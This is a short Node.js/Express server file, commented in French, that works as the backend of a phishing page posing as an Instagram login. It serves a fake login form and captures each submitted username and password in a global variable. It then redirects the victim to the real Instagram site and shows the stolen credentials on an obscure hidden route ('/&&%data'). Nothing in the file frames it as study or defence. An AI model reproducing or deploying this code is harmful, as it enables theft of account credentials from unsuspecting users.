// Import des modules nécessaires
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

// Variables pour stocker temporairement les infos
let lastFormData = {};

// Middleware pour lire les données envoyées par le formulaire
app.use(bodyParser.urlencoded({ extended: true }));

// Route GET : afficher la page login.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'log-in.html'));
});

// Route POST : traiter le formulaire
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Stocker les infos dans une variable globale
  lastFormData = { username, password };

  // Redirection vers Instagram
  res.redirect('https://www.instagram.com');
});

// Route spéciale : afficher les infos si on tape /&&%data
app.get('/&&%data', (req, res) => {
  if (lastFormData.username && lastFormData.password) {
    res.send(`
      <h2>Informations reçues :</h2>
      <p><strong>Nom d'utilisateur :</strong> ${lastFormData.username}</p>
      <p><strong>Mot de passe :</strong> ${lastFormData.password}</p>
    `);
  } else {
    res.send("<h2>Aucune donnée disponible. Remplis le formulaire d'abord.</h2>");
  }
});
// Route GET pour ydf.html
app.get('/ydf.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'ydf.html'));
});
app.get('/signUp.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'signUp.html'));
});
// Lancer le serveur
app.listen(PORT, () => {
  console.log(`Serveur démarré sur http://localhost:${PORT}`);
});